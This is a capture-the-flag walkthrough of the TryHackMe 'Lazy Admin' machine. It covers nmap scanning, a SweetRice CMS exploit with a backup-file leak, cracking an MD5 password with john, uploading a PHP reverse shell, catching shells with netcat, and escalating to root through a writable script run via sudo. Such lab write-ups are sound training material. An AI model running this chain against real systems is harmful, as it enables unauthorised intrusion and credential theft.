---
title: Walkthrough - Lazy Admin
published: true
---

Easy linux machine to practice your skills

Linux/Exploit

[https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin)

* * *

## Enumerate

```shell
sudo nmap -sC -sV -O 10.10.154.224 -p22,80  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 14:01 PDT
Nmap scan report for 10.10.154.224
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds
```

* * * 

## Exploit

1. ``searchsploit sweetrice``
2. ``cat /usr/share/exploitdb/exploits/php/webapps/40718.txt``
3. download mysql backup and cat
4. password hash for admin/manager MD5 42f749ade7f9e195bf475f37a44cafcb
5. feed john ``john admin.manager.hash --format=Raw-MD5 --wordlist=/usr/share/seclists/Passwords/rockyou.txt``
6. Password123

- upload php shellcode https://www.exploit-db.com/exploits/40700
- access shellcode http://10.10.154.224/content/inc/ads/shellcode.php

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Lazy-Admin]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.2.127.225] from (UNKNOWN) [10.10.154.224] 35016
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 01:46:23 up  2:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

- ``python -c 'import pty; pty.spawn("/bin/bash")'``
- Check for easy privesc:

```shell
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

- so this is running a backup.pl which is running a /etc/copy.sh
- we can replace copy.sh with our ip and get another rev shell running ``/usr/bin/perl /home/itguy/backup.pl``

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/Lazy-Admin]
└─$ nc -lvnp 10000                                                                                       
listening on [any] 10000 ...
# whoami
root
# pwd
/home/itguy
# cd /root
# ls -las
total 28
4 drwxr-x---  4 root root 4096 iul 14 19:52 .
4 drwxr-xr-x 23 root root 4096 nov 29  2019 ..
0 lrwxrwxrwx  1 root root    9 nov 29  2019 .bash_history -> /dev/null
4 -rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
4 drwx------  2 root root 4096 feb 27  2019 .cache
4 drwxr-xr-x  2 root root 4096 nov 29  2019 .nano
4 -rw-r--r--  1 root root  148 aug 17  2015 .profile
4 -rw-r--r--  1 root root   38 nov 29  2019 root.txt
# cat root.txt
```


* * * 